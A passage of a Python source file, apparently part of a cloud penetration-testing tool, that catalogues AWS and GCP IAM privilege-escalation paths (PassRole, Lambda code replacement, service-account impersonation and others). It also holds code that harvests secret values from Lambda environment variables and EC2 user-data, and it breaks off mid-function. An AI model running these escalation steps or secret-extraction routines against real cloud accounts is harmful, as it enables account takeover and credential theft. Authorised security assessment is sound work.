        {
            "technique": PrivEscTechnique.AWS_PASS_ROLE_EC2,
            "name": "PassRole to EC2 Instance",
            "required_permissions": ["iam:PassRole", "ec2:RunInstances"],
            "api_calls": [
                {
                    "service": "ec2",
                    "action": "RunInstances",
                    "params": {"InstanceType": "t3.micro", "IamInstanceProfile": {"Arn": "{instance_profile_arn}"}},
                }
            ],
            "steps": [
                "Find a role with EC2 trust and elevated permissions",
                "Launch an EC2 instance with that role attached",
                "SSH into the instance and access IMDS for credentials",
            ],
            "impact": "Access credentials of attached role",
            "detection_risk": "medium",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AWS_PASS_ROLE_CLOUDFORMATION,
            "name": "PassRole to CloudFormation Stack",
            "required_permissions": ["iam:PassRole", "cloudformation:CreateStack"],
            "api_calls": [
                {
                    "service": "cloudformation",
                    "action": "CreateStack",
                    "params": {"StackName": "escalation", "RoleARN": "{admin_role_arn}", "TemplateBody": "{template}"},
                }
            ],
            "steps": [
                "Create a CloudFormation stack with an admin role",
                "The template creates resources or outputs secrets",
                "Stack operates with the privileges of the passed role",
            ],
            "impact": "Arbitrary resource creation with admin role",
            "detection_risk": "medium",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AWS_PASS_ROLE_DATAPIPELINE,
            "name": "PassRole to Data Pipeline",
            "required_permissions": ["iam:PassRole", "datapipeline:CreatePipeline", "datapipeline:PutPipelineDefinition"],
            "api_calls": [
                {
                    "service": "datapipeline",
                    "action": "CreatePipeline",
                    "params": {"name": "escalation", "uniqueId": "escalation-001"},
                },
            ],
            "steps": [
                "Create a Data Pipeline with an elevated role",
                "Define pipeline with shell command activity",
                "Pipeline executes commands with the attached role",
            ],
            "impact": "Command execution as pipeline role",
            "detection_risk": "medium",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AWS_PASS_ROLE_GLUE,
            "name": "PassRole to Glue Dev Endpoint",
            "required_permissions": ["iam:PassRole", "glue:CreateDevEndpoint"],
            "api_calls": [
                {
                    "service": "glue",
                    "action": "CreateDevEndpoint",
                    "params": {"EndpointName": "escalation", "RoleArn": "{admin_role_arn}"},
                }
            ],
            "steps": [
                "Create a Glue development endpoint with admin role",
                "SSH into the endpoint",
                "Access credentials via the attached role",
            ],
            "impact": "Interactive access with admin role credentials",
            "detection_risk": "low",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AWS_LAMBDA_INVOKE,
            "name": "Invoke Existing Privileged Lambda",
            "required_permissions": ["lambda:InvokeFunction"],
            "api_calls": [
                {
                    "service": "lambda",
                    "action": "Invoke",
                    "params": {"FunctionName": "{function_name}"},
                }
            ],
            "steps": [
                "List Lambda functions to find those with privileged roles",
                "Invoke functions that expose credentials or perform privileged actions",
                "Extract environment variables or outputs",
            ],
            "impact": "Execute code in context of Lambda role",
            "detection_risk": "low",
            "mitre": "T1059.006",
        },
        {
            "technique": PrivEscTechnique.AWS_LAMBDA_CREATE_FUNCTION,
            "name": "Create Lambda with Existing Role",
            "required_permissions": ["lambda:CreateFunction", "iam:PassRole"],
            "api_calls": [
                {
                    "service": "lambda",
                    "action": "CreateFunction",
                    "params": {"FunctionName": "exfil", "Role": "{role_arn}", "Runtime": "python3.9"},
                }
            ],
            "steps": [
                "Create a new Lambda function with a privileged execution role",
                "Function code extracts role credentials or performs privileged actions",
                "Invoke the function",
            ],
            "impact": "Code execution with targeted role privileges",
            "detection_risk": "medium",
            "mitre": "T1059.006",
        },
        {
            "technique": PrivEscTechnique.AWS_LAMBDA_UPDATE_CODE,
            "name": "Update Existing Lambda Code",
            "required_permissions": ["lambda:UpdateFunctionCode"],
            "api_calls": [
                {
                    "service": "lambda",
                    "action": "UpdateFunctionCode",
                    "params": {"FunctionName": "{function_name}", "ZipFile": "{malicious_code}"},
                }
            ],
            "steps": [
                "Identify a Lambda function with elevated execution role",
                "Replace function code with credential-extracting code",
                "Wait for the function to be invoked (or invoke it)",
            ],
            "impact": "Hijack existing function to steal credentials",
            "detection_risk": "medium",
            "mitre": "T1059.006",
        },
        {
            "technique": PrivEscTechnique.AWS_STS_ASSUME_ROLE,
            "name": "STS AssumeRole Chain",
            "required_permissions": ["sts:AssumeRole"],
            "api_calls": [
                {
                    "service": "sts",
                    "action": "AssumeRole",
                    "params": {"RoleArn": "{target_role_arn}", "RoleSessionName": "siren"},
                }
            ],
            "steps": [
                "Identify roles with trust policies allowing current principal",
                "Assume the target role to get temporary credentials",
                "Chain multiple role assumptions for cross-account access",
            ],
            "impact": "Assume identity of target role, potentially cross-account",
            "detection_risk": "low",
            "mitre": "T1550.001",
        },
        {
            "technique": PrivEscTechnique.AWS_SSM_SEND_COMMAND,
            "name": "SSM Send Command to EC2",
            "required_permissions": ["ssm:SendCommand"],
            "api_calls": [
                {
                    "service": "ssm",
                    "action": "SendCommand",
                    "params": {
                        "InstanceIds": ["{instance_id}"],
                        "DocumentName": "AWS-RunShellScript",
                        "Parameters": {"commands": ["{command}"]},
                    },
                }
            ],
            "steps": [
                "Identify EC2 instances with SSM agent installed",
                "Send a command to execute on the instance",
                "Retrieve output including credentials and secrets",
            ],
            "impact": "Remote command execution on EC2 instances",
            "detection_risk": "medium",
            "mitre": "T1021.007",
        },
        {
            "technique": PrivEscTechnique.AWS_SSM_START_SESSION,
            "name": "SSM Start Interactive Session",
            "required_permissions": ["ssm:StartSession"],
            "api_calls": [
                {
                    "service": "ssm",
                    "action": "StartSession",
                    "params": {"Target": "{instance_id}"},
                }
            ],
            "steps": [
                "Identify EC2 instances with SSM agent",
                "Start interactive session (shell access)",
                "Access instance role credentials via IMDS",
            ],
            "impact": "Interactive shell on EC2 instance",
            "detection_risk": "low",
            "mitre": "T1021.007",
        },
        {
            "technique": PrivEscTechnique.AWS_CODESTAR_CREATE_PROJECT,
            "name": "CodeStar Project Creation",
            "required_permissions": ["codestar:CreateProject"],
            "api_calls": [
                {
                    "service": "codestar",
                    "action": "CreateProject",
                    "params": {"name": "escalation", "id": "escalation"},
                }
            ],
            "steps": [
                "Create a CodeStar project",
                "CodeStar creates a service role with broad permissions",
                "Use the project resources for privileged operations",
            ],
            "impact": "Inherit CodeStar service role permissions",
            "detection_risk": "low",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.AWS_COGNITO_SET_ATTRIBUTES,
            "name": "Cognito Identity Pool Attribute Injection",
            "required_permissions": ["cognito-identity:SetIdentityPoolRoles"],
            "api_calls": [
                {
                    "service": "cognito-identity",
                    "action": "SetIdentityPoolRoles",
                    "params": {"IdentityPoolId": "{pool_id}", "Roles": {"authenticated": "{admin_role_arn}"}},
                }
            ],
            "steps": [
                "Identify Cognito Identity Pools",
                "Set the authenticated role to an admin role",
                "Authenticate and receive admin credentials",
            ],
            "impact": "Obtain admin role credentials via Cognito",
            "detection_risk": "medium",
            "mitre": "T1098.003",
        },
    ]

    # AWS admin policy document for privesc
    ADMIN_POLICY_DOCUMENT = json.dumps({
        "Version": "2012-10-17",
        "Statement": [{
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*",
        }],
    })

    # Lambda environment variables that commonly contain secrets
    LAMBDA_SECRET_ENV_VARS = [
        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
        "DB_PASSWORD", "DB_HOST", "DATABASE_URL", "MYSQL_PASSWORD",
        "POSTGRES_PASSWORD", "REDIS_PASSWORD", "REDIS_URL",
        "API_KEY", "API_SECRET", "SECRET_KEY", "ENCRYPTION_KEY",
        "JWT_SECRET", "AUTH_TOKEN", "OAUTH_CLIENT_SECRET",
        "STRIPE_SECRET_KEY", "TWILIO_AUTH_TOKEN", "SENDGRID_API_KEY",
        "SLACK_TOKEN", "SLACK_WEBHOOK", "GITHUB_TOKEN",
        "PRIVATE_KEY", "SSH_KEY", "CERTIFICATE",
        "SENTRY_DSN", "DATADOG_API_KEY", "NEW_RELIC_LICENSE_KEY",
        "SMTP_PASSWORD", "MAIL_PASSWORD", "EMAIL_PASSWORD",
        "S3_BUCKET", "S3_SECRET", "AZURE_STORAGE_KEY",
        "GCP_SERVICE_ACCOUNT", "GOOGLE_APPLICATION_CREDENTIALS",
        "MONGO_URI", "MONGODB_URI", "CONNECTION_STRING",
    ]

    def __init__(
        self,
        credential: Optional[CloudCredential] = None,
        region: str = "us-east-1",
    ) -> None:
        self._lock = threading.RLock()
        self._credential = credential
        self._region = region
        self._findings: List[CloudFinding] = []
        self._privesc_paths: List[CloudPrivEscPath] = []
        self._discovered_roles: List[Dict[str, Any]] = []
        self._discovered_users: List[Dict[str, Any]] = []
        self._discovered_groups: List[Dict[str, Any]] = []
        self._discovered_policies: List[Dict[str, Any]] = []
        self._discovered_lambdas: List[Dict[str, Any]] = []
        self._lambda_secrets: Dict[str, Dict[str, str]] = {}
        self._sts_chain: List[Dict[str, Any]] = []
        self._userdata_secrets: Dict[str, Any] = {}
        logger.info("AWSExploiter initialized (region=%s)", region)

    def find_privesc_paths(
        self, current_permissions: Optional[List[str]] = None
    ) -> List[CloudPrivEscPath]:
        """
        Analyze current permissions against all known privesc paths.

        Returns a list of feasible privilege escalation paths.
        """
        with self._lock:
            perms = current_permissions or []
            perm_set = set(p.lower() for p in perms)
            self._privesc_paths.clear()

            for path_def in self.PRIVESC_PATHS:
                required = path_def["required_permissions"]
                required_lower = set(p.lower() for p in required)

                # Check exact match
                has_exact = required_lower.issubset(perm_set)

                # Check wildcard match (e.g., iam:* matches iam:CreatePolicyVersion)
                has_wildcard = False
                if not has_exact:
                    has_wildcard = self._check_wildcard_permissions(
                        required_lower, perm_set
                    )

                # Check for * (full admin)
                has_admin = "*" in perm_set or "*:*" in perm_set

                is_feasible = has_exact or has_wildcard or has_admin

                path = CloudPrivEscPath(
                    provider=CloudProvider.AWS,
                    technique=path_def["technique"],
                    source_principal=self._credential.principal if self._credential else "",
                    target_principal="admin",
                    required_permissions=required,
                    current_permissions=perms,
                    steps=path_def["steps"],
                    api_calls=path_def["api_calls"],
                    success_probability=0.85 if is_feasible else 0.0,
                    impact_level=Severity.CRITICAL,
                    is_feasible=is_feasible,
                    detection_risk=path_def.get("detection_risk", "medium"),
                    mitre_technique=path_def.get("mitre", ""),
                    notes=path_def.get("impact", ""),
                )
                self._privesc_paths.append(path)

                if is_feasible:
                    self._findings.append(CloudFinding(
                        provider=CloudProvider.AWS,
                        category=AttackCategory.IAM_PRIVILEGE_ESCALATION,
                        severity=Severity.CRITICAL,
                        title=f"IAM PrivEsc: {path_def['name']}",
                        description=(
                            f"Current permissions allow privilege escalation via "
                            f"{path_def['name']}. Required: {', '.join(required)}"
                        ),
                        technique=path_def["name"],
                        is_exploitable=True,
                        exploitation_steps=path_def["steps"],
                        impact=path_def.get("impact", ""),
                        mitre_attack_id=path_def.get("mitre", ""),
                    ))

            feasible = [p for p in self._privesc_paths if p.is_feasible]
            logger.info(
                "Found %d feasible privesc paths out of %d total",
                len(feasible), len(self._privesc_paths),
            )
            return feasible

    def _check_wildcard_permissions(
        self, required: Set[str], available: Set[str]
    ) -> bool:
        """Check if wildcard permissions satisfy requirements."""
        for req in required:
            matched = False
            # Split service:action
            parts = req.split(":")
            if len(parts) != 2:
                continue
            service, action = parts

            for avail in available:
                a_parts = avail.split(":")
                if len(a_parts) != 2:
                    if avail == "*":
                        matched = True
                        break
                    continue
                a_service, a_action = a_parts

                # Check service match
                if a_service != service and a_service != "*":
                    continue

                # Check action match (supports *)
                if a_action == "*":
                    matched = True
                    break
                if a_action == action:
                    matched = True
                    break

            if not matched:
                return False
        return True

    def extract_lambda_env_secrets(
        self, functions: Optional[List[Dict[str, Any]]] = None
    ) -> Dict[str, Dict[str, str]]:
        """
        Extract secrets from Lambda function environment variables.

        Args:
            functions: List of Lambda function configurations.
                       Each dict should have 'FunctionName' and 'Environment.Variables'.

        Returns:
            Dict mapping function name to extracted secret env vars.
        """
        with self._lock:
            secrets: Dict[str, Dict[str, str]] = {}
            funcs = functions or self._discovered_lambdas

            for func in funcs:
                func_name = func.get("FunctionName", func.get("function_name", "unknown"))
                env_vars = func.get("Environment", {}).get("Variables", {})
                if not env_vars:
                    env_vars = func.get("environment", {}).get("variables", {})

                found_secrets: Dict[str, str] = {}
                for key, value in env_vars.items():
                    key_upper = key.upper()
                    # Check against known secret env var names
                    if key_upper in self.LAMBDA_SECRET_ENV_VARS:
                        found_secrets[key] = value
                    # Pattern matching for unknown secret names
                    elif any(
                        kw in key_upper
                        for kw in [
                            "SECRET", "PASSWORD", "TOKEN", "KEY", "CREDENTIAL",
                            "AUTH", "PRIVATE", "CERT", "CONN_STR", "DSN",
                        ]
                    ):
                        found_secrets[key] = value
                    # Check for AWS access key patterns in values
                    elif re.match(r"^(?:AKIA|ASIA)[0-9A-Z]{16}$", value):
                        found_secrets[key] = value
                    # Check for connection strings
                    elif re.match(
                        r"^(?:mongodb|postgresql|mysql|redis|amqp)://", value
                    ):
                        found_secrets[key] = value

                if found_secrets:
                    secrets[func_name] = found_secrets
                    self._findings.append(CloudFinding(
                        provider=CloudProvider.AWS,
                        category=AttackCategory.SECRETS_EXTRACTION,
                        severity=Severity.CRITICAL,
                        title=f"Secrets in Lambda: {func_name}",
                        description=(
                            f"Found {len(found_secrets)} secret environment variables "
                            f"in Lambda function '{func_name}': {', '.join(found_secrets.keys())}"
                        ),
                        technique="Lambda Environment Variable Extraction",
                        is_exploitable=True,
                        evidence={"secret_keys": list(found_secrets.keys())},
                        remediation=(
                            "Use AWS Secrets Manager or SSM Parameter Store. "
                            "Never store secrets in Lambda environment variables."
                        ),
                        mitre_attack_id="T1552.001",
                    ))

            self._lambda_secrets = secrets
            return secrets

    def analyze_sts_assume_role_chains(
        self, roles: Optional[List[Dict[str, Any]]] = None
    ) -> List[Dict[str, Any]]:
        """
        Analyze STS assume-role trust chains for pivoting opportunities.

        Discovers:
            - Direct role assumptions
            - Chained role assumptions (A -> B -> C)
            - Cross-account trust relationships
            - Overly permissive trust policies
        """
        with self._lock:
            chains: List[Dict[str, Any]] = []
            role_list = roles or self._discovered_roles

            for role in role_list:
                role_name = role.get("RoleName", role.get("role_name", ""))
                role_arn = role.get("Arn", role.get("arn", ""))
                trust_policy = role.get(
                    "AssumeRolePolicyDocument",
                    role.get("trust_policy", {}),
                )

                if isinstance(trust_policy, str):
                    try:
                        trust_policy = json.loads(trust_policy)
                    except json.JSONDecodeError:
                        continue

                statements = trust_policy.get("Statement", [])
                for stmt in statements:
                    if stmt.get("Effect") != "Allow":
                        continue

                    principal = stmt.get("Principal", {})
                    conditions = stmt.get("Condition", {})

                    # Analyze principal types
                    trusted_entities = self._extract_trusted_entities(principal)

                    for entity in trusted_entities:
                        chain = {
                            "role_name": role_name,
                            "role_arn": role_arn,
                            "trusted_entity": entity["entity"],
                            "entity_type": entity["type"],
                            "conditions": conditions,
                            "is_cross_account": entity.get("is_cross_account", False),
                            "is_overly_permissive": entity.get("is_overly_permissive", False),
                            "risk_level": "critical" if entity.get("is_overly_permissive") else "medium",
                        }
                        chains.append(chain)

                        if entity.get("is_overly_permissive"):
                            self._findings.append(CloudFinding(
                                provider=CloudProvider.AWS,
                                category=AttackCategory.CROSS_ACCOUNT_PIVOT,
                                severity=Severity.CRITICAL,
                                title=f"Overly Permissive Trust Policy: {role_name}",
                                description=(
                                    f"Role '{role_name}' has an overly permissive trust policy "
                                    f"allowing {entity['entity']} to assume it."
                                ),
                                technique="STS AssumeRole Chain Analysis",
                                is_exploitable=True,
                                remediation="Restrict trust policy principals and add conditions.",
                                mitre_attack_id="T1550.001",
                            ))

                        if entity.get("is_cross_account"):
                            self._findings.append(CloudFinding(
                                provider=CloudProvider.AWS,
                                category=AttackCategory.CROSS_ACCOUNT_PIVOT,
                                severity=Severity.HIGH,
                                title=f"Cross-Account Trust: {role_name}",
                                description=(
                                    f"Role '{role_name}' trusts external account/entity: "
                                    f"{entity['entity']}. Cross-account pivoting possible."
                                ),
                                technique="Cross-Account Role Assumption",
                                is_exploitable=True,
                                remediation="Verify cross-account trusts are intentional. Add ExternalId conditions.",
                                mitre_attack_id="T1550.001",
                            ))

            self._sts_chain = chains
            logger.info("Analyzed %d STS assume-role chains", len(chains))
            return chains

    def _extract_trusted_entities(self, principal: Any) -> List[Dict[str, Any]]:
        """Extract and classify trusted entities from a trust policy principal."""
        entities: List[Dict[str, Any]] = []

        if isinstance(principal, str):
            if principal == "*":
                entities.append({
                    "entity": "*",
                    "type": "wildcard",
                    "is_overly_permissive": True,
                    "is_cross_account": True,
                })
            else:
                entities.append({"entity": principal, "type": "string", "is_cross_account": False, "is_overly_permissive": False})
            return entities

        if not isinstance(principal, dict):
            return entities

        # AWS account principals
        aws_principals = principal.get("AWS", [])
        if isinstance(aws_principals, str):
            aws_principals = [aws_principals]
        for p in aws_principals:
            is_wild = p == "*"
            is_cross = False
            if not is_wild and self._credential and self._credential.account_id:
                is_cross = self._credential.account_id not in p
            entities.append({
                "entity": p,
                "type": "AWS",
                "is_overly_permissive": is_wild,
                "is_cross_account": is_cross or is_wild,
            })

        # Service principals
        service_principals = principal.get("Service", [])
        if isinstance(service_principals, str):
            service_principals = [service_principals]
        for s in service_principals:
            entities.append({
                "entity": s,
                "type": "Service",
                "is_overly_permissive": False,
                "is_cross_account": False,
            })

        # Federated principals
        federated_principals = principal.get("Federated", [])
        if isinstance(federated_principals, str):
            federated_principals = [federated_principals]
        for f in federated_principals:
            entities.append({
                "entity": f,
                "type": "Federated",
                "is_overly_permissive": "*" in f,
                "is_cross_account": True,
            })

        return entities

    def extract_ec2_userdata_secrets(
        self, userdata_list: Optional[List[Dict[str, str]]] = None
    ) -> Dict[str, Dict[str, Any]]:
        """
        Extract secrets from EC2 instance user-data/startup scripts.

        Analyzes base64-decoded user-data for:
            - Hardcoded passwords and API keys
            - AWS credentials
            - Database connection strings
            - Private keys and certificates
        """
        with self._lock:
            results: Dict[str, Dict[str, Any]] = {}
            items = userdata_list or []

            for item in items:
                instance_id = item.get("instance_id", "unknown")
                raw_userdata = item.get("userdata", "")

                # Try base64 decode
                decoded = raw_userdata
                try:
                    decoded = base64.b64decode(raw_userdata).decode("utf-8", errors="replace")
                except Exception:
                    pass

                if not decoded:
                    continue

                # Scan for secrets
                secret_patterns = {
                    "aws_access_key": r"(?:AKIA|ASIA)[0-9A-Z]{16}",
                    "aws_secret_key": r"(?:aws_secret_access_key|AWS_SECRET_ACCESS_KEY)\s*[=:]\s*['\"]?([A-Za-z0-9/+=]{40})['\"]?",
                    "password_in_script": r"(?:password|passwd|pwd|PASS)\s*[=:]\s*['\"]([^'\"]{4,})['\"]",
                    "database_url": r"(?:mysql|postgresql|mongodb|redis)://[^\s'\"]+",
                    "private_key": r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----",
                    "api_key": r"(?:api[_-]?key|apikey)\s*[=:]\s*['\"]?([A-Za-z0-9_\-]{16,})['\"]?",
                    "token": r"(?:token|TOKEN)\s*[=:]\s*['\"]?([A-Za-z0-9_\-\.]{20,})['\"]?",
                    "connection_string": r"Server=[^;]+;.*Password=[^;]+",
                    "env_export": r"export\s+(?:PASSWORD|SECRET|TOKEN|KEY|CREDENTIAL)\w*\s*=\s*['\"]?([^'\"\s]+)",
                }

                found: Dict[str, List[str]] = {}
                for name, pattern in secret_patterns.items():
                    matches = re.findall(pattern, decoded, re.IGNORECASE)
                    if matches:
                        found[name] = matches[:5]

                if found:
                    results[instance_id] = {
                        "secrets": found,
                        "userdata_length": len(decoded),
                        "is_base64": decoded != raw_userdata,
                    }

                    self._findings.append(CloudFinding(
                        provider=CloudProvider.AWS,
                        category=AttackCategory.SECRETS_EXTRACTION,
                        severity=Severity.CRITICAL,
                        title=f"Secrets in EC2 User-Data: {instance_id}",
                        description=(
                            f"Found {sum(len(v) for v in found.values())} secrets "
                            f"in EC2 instance '{instance_id}' user-data. "
                            f"Types: {', '.join(found.keys())}"
                        ),
                        technique="EC2 User-Data Secret Extraction",
                        is_exploitable=True,
                        evidence={"secret_types": list(found.keys())},
                        remediation=(
                            "Never store secrets in user-data. Use IAM roles, "
                            "Secrets Manager, or SSM Parameter Store."
                        ),
                        mitre_attack_id="T1552.005",
                    ))

            self._userdata_secrets = results
            return results

    def get_findings(self) -> List[CloudFinding]:
        """Return all findings."""
        with self._lock:
            return list(self._findings)

    def get_privesc_paths(self) -> List[CloudPrivEscPath]:
        """Return all discovered privesc paths."""
        with self._lock:
            return list(self._privesc_paths)

    def get_feasible_paths(self) -> List[CloudPrivEscPath]:
        """Return only feasible privesc paths."""
        with self._lock:
            return [p for p in self._privesc_paths if p.is_feasible]

    def to_dict(self) -> Dict[str, Any]:
        """Serialize exploiter state."""
        with self._lock:
            feasible = [p for p in self._privesc_paths if p.is_feasible]
            return {
                "provider": "AWS",
                "region": self._region,
                "total_privesc_paths": len(self._privesc_paths),
                "feasible_paths": len(feasible),
                "lambda_secrets_count": sum(
                    len(v) for v in self._lambda_secrets.values()
                ),
                "sts_chains": len(self._sts_chain),
                "userdata_secrets": len(self._userdata_secrets),
                "findings": [f.to_dict() for f in self._findings],
                "privesc_paths": [p.to_dict() for p in feasible],
            }


# ════════════════════════════════════════════════════════════════════════════════
# GCP EXPLOITER — Service Account Impersonation, Cloud Functions, GCS
# ════════════════════════════════════════════════════════════════════════════════

class GCPExploiter:
    """
    GCP-specific exploitation engine for privilege escalation and lateral movement.

    Capabilities:
        - Service account impersonation chains
        - Cloud Functions environment extraction
        - GCS bucket enumeration and exploitation
        - IAM policy analysis for GCP
        - Compute Engine metadata and startup script extraction

    Usage:
        exploiter = GCPExploiter(credential=gcp_cred, project_id="my-project")
        paths = exploiter.find_privesc_paths()
        secrets = exploiter.extract_function_secrets()
    """

    # GCP IAM privilege escalation paths
    GCP_PRIVESC_PATHS: List[Dict[str, Any]] = [
        {
            "technique": PrivEscTechnique.GCP_SA_IMPERSONATE,
            "name": "Service Account Impersonation",
            "required_permissions": ["iam.serviceAccounts.getAccessToken"],
            "api_calls": [
                {
                    "service": "iamcredentials",
                    "method": "generateAccessToken",
                    "url": "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{sa}:generateAccessToken",
                }
            ],
            "steps": [
                "Identify service accounts with higher privileges",
                "Use iam.serviceAccounts.getAccessToken to generate access token",
                "Authenticate as the target service account",
                "Access resources with elevated permissions",
            ],
            "impact": "Full access as target service account",
            "detection_risk": "medium",
            "mitre": "T1550.001",
        },
        {
            "technique": PrivEscTechnique.GCP_SA_KEY_CREATE,
            "name": "Create Service Account Key",
            "required_permissions": ["iam.serviceAccountKeys.create"],
            "api_calls": [
                {
                    "service": "iam",
                    "method": "projects.serviceAccounts.keys.create",
                    "url": "https://iam.googleapis.com/v1/projects/{project}/serviceAccounts/{sa}/keys",
                }
            ],
            "steps": [
                "Identify a service account with elevated privileges",
                "Create a new JSON key for that service account",
                "Download and use the key for persistent access",
            ],
            "impact": "Persistent access as service account (key doesn't expire automatically)",
            "detection_risk": "high",
            "mitre": "T1098.001",
        },
        {
            "technique": PrivEscTechnique.GCP_SA_TOKEN_CREATOR,
            "name": "Service Account Token Creator Role Abuse",
            "required_permissions": ["iam.serviceAccounts.implicitDelegation"],
            "api_calls": [
                {
                    "service": "iamcredentials",
                    "method": "generateAccessToken",
                    "url": "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{sa}:generateAccessToken",
                }
            ],
            "steps": [
                "Identify SA with Token Creator role on higher-privileged SA",
                "Use implicit delegation chain: SA_A -> SA_B -> SA_C",
                "Generate token for the highest-privilege SA in chain",
            ],
            "impact": "Chained impersonation to high-privilege service account",
            "detection_risk": "low",
            "mitre": "T1550.001",
        },
        {
            "technique": PrivEscTechnique.GCP_CLOUDFUNC_DEPLOY,
            "name": "Deploy Cloud Function with Elevated SA",
            "required_permissions": [
                "cloudfunctions.functions.create",
                "iam.serviceAccounts.actAs",
            ],
            "api_calls": [
                {
                    "service": "cloudfunctions",
                    "method": "projects.locations.functions.create",
                    "url": "https://cloudfunctions.googleapis.com/v1/projects/{project}/locations/{location}/functions",
                }
            ],
            "steps": [
                "Identify a service account with elevated privileges",
                "Create a Cloud Function running as that service account",
                "Function code extracts credentials or performs privileged operations",
                "Invoke the function via HTTP trigger or pub/sub",
            ],
            "impact": "Code execution with elevated SA permissions",
            "detection_risk": "medium",
            "mitre": "T1059.006",
        },
        {
            "technique": PrivEscTechnique.GCP_COMPUTE_SSH,
            "name": "SSH into Compute Instance via OS Login",
            "required_permissions": [
                "compute.instances.osLogin",
                "compute.instances.setMetadata",
            ],
            "api_calls": [
                {
                    "service": "compute",
                    "method": "instances.setMetadata",
                    "url": "https://compute.googleapis.com/compute/v1/projects/{project}/zones/{zone}/instances/{instance}/setMetadata",
                }
            ],
            "steps": [
                "Identify instances with attached service accounts",
                "Set SSH key in instance metadata or project metadata",
                "SSH into the instance",
                "Access service account credentials via metadata server",
            ],
            "impact": "Shell access and SA credential extraction",
            "detection_risk": "medium",
            "mitre": "T1021.004",
        },
        {
            "technique": PrivEscTechnique.GCP_COMPUTE_STARTUP_SCRIPT,
            "name": "Modify Compute Instance Startup Script",
            "required_permissions": ["compute.instances.setMetadata"],
            "api_calls": [
                {
                    "service": "compute",
                    "method": "instances.setMetadata",
                    "url": "https://compute.googleapis.com/compute/v1/projects/{project}/zones/{zone}/instances/{instance}/setMetadata",
                }
            ],
            "steps": [
                "Set a malicious startup script on a target instance",
                "Restart the instance (or wait for restart)",
                "Startup script runs as root with SA access",
                "Exfiltrate credentials or establish persistence",
            ],
            "impact": "Root code execution on compute instance",
            "detection_risk": "high",
            "mitre": "T1059.004",
        },
        {
            "technique": PrivEscTechnique.GCP_SET_IAM_POLICY,
            "name": "Set IAM Policy on Project/Resource",
            "required_permissions": ["resourcemanager.projects.setIamPolicy"],
            "api_calls": [
                {
                    "service": "cloudresourcemanager",
                    "method": "projects.setIamPolicy",
                    "url": "https://cloudresourcemanager.googleapis.com/v1/projects/{project}:setIamPolicy",
                }
            ],
            "steps": [
                "Get current IAM policy for the project",
                "Add binding granting Owner or Editor role to attacker",
                "Set the modified IAM policy",
                "Full project access acquired",
            ],
            "impact": "Owner/Editor access to entire GCP project",
            "detection_risk": "high",
            "mitre": "T1098.003",
        },
        {
            "technique": PrivEscTechnique.GCP_STORAGE_HMAC_KEY,
            "name": "Create HMAC Key for Service Account",
            "required_permissions": ["storage.hmacKeys.create"],
            "api_calls": [
                {
                    "service": "storage",
                    "method": "projects.hmacKeys.create",
                    "url": "https://storage.googleapis.com/storage/v1/projects/{project}/hmacKeys?serviceAccountEmail={sa}",
                }
            ],
            "steps": [
                "Create an HMAC key for a service account",
                "Use the HMAC key to authenticate S3-compatible requests",
                "Access GCS buckets via the interoperability API",
            ],
            "impact": "Persistent storage access as service account",
            "detection_risk": "low",
            "mitre": "T1098.001",
        },
        {
            "technique": PrivEscTechnique.GCP_ORGPOLICY_SET,
            "name": "Modify Organization Policy",
            "required_permissions": ["orgpolicy.policy.set"],
            "api_calls": [
                {
                    "service": "orgpolicy",
                    "method": "projects.policies.patch",
                    "url": "https://orgpolicy.googleapis.com/v2/projects/{project}/policies/{policy}",
                }
            ],
            "steps": [
                "Disable organization policy constraints",
                "Remove restrictions on service account key creation, etc.",
                "Perform previously blocked privileged operations",
            ],
            "impact": "Disable security guardrails across organization",
            "detection_risk": "critical",
            "mitre": "T1562.001",
        },
        {
            "technique": PrivEscTechnique.GCP_DEPLOYMENTMGR_CREATE,
            "name": "Create Deployment Manager Deployment",
            "required_permissions": [
                "deploymentmanager.deployments.create",
                "iam.serviceAccounts.actAs",
            ],
            "api_calls": [
                {
                    "service": "deploymentmanager",
                    "method": "deployments.insert",
                    "url": "https://www.googleapis.com/deploymentmanager/v2/projects/{project}/global/deployments",
                }
            ],
            "steps": [
                "Create a Deployment Manager deployment",
                "Deployment runs as the project's Google APIs SA (Editor by default)",
                "Deploy resources that grant attacker elevated access",
            ],
            "impact": "Arbitrary resource creation with project Editor role",
            "detection_risk": "medium",
            "mitre": "T1098.003",
        },
    ]

    # Cloud Functions environment variables commonly containing secrets
    GCF_SECRET_ENV_VARS = [
        "GOOGLE_APPLICATION_CREDENTIALS", "GCP_SERVICE_ACCOUNT",
        "FIREBASE_TOKEN", "FIREBASE_API_KEY",
        "DB_PASSWORD", "DATABASE_URL", "SQL_PASSWORD",
        "API_KEY", "API_SECRET", "SECRET_KEY",
        "STRIPE_SECRET_KEY", "SENDGRID_API_KEY",
        "SLACK_TOKEN", "GITHUB_TOKEN",
        "PRIVATE_KEY", "ENCRYPTION_KEY",
        "REDIS_URL", "REDIS_PASSWORD",
        "MONGO_URI", "MONGODB_URI",
        "JWT_SECRET", "AUTH_SECRET",
        "SMTP_PASSWORD", "MAIL_PASSWORD",
        "WEBHOOK_SECRET", "SIGNING_KEY",
    ]

    def __init__(
        self,
        credential: Optional[CloudCredential] = None,
        project_id: str = "",
        region: str = "us-central1",
    ) -> None:
        self._lock = threading.RLock()
        self._credential = credential
        self._project_id = project_id
        self._region = region
        self._findings: List[CloudFinding] = []
        self._privesc_paths: List[CloudPrivEscPath] = []
        self._discovered_sas: List[Dict[str, Any]] = []
        self._discovered_functions: List[Dict[str, Any]] = []
        self._discovered_buckets: List[Dict[str, Any]] = []
        self._impersonation_chains: List[Dict[str, Any]] = []
        self._function_secrets: Dict[str, Dict[str, str]] = {}
        logger.info("GCPExploiter initialized (project=%s, region=%s)", project_id, region)

    def find_privesc_paths(
        self, current_permissions: Optional[List[str]] = None
    ) -> List[CloudPrivEscPath]:
        """Analyze current permissions against GCP privesc paths."""
        with self._lock:
            perms = current_permissions or []
            perm_set = set(p.lower() for p in perms)
            self._privesc_paths.clear()

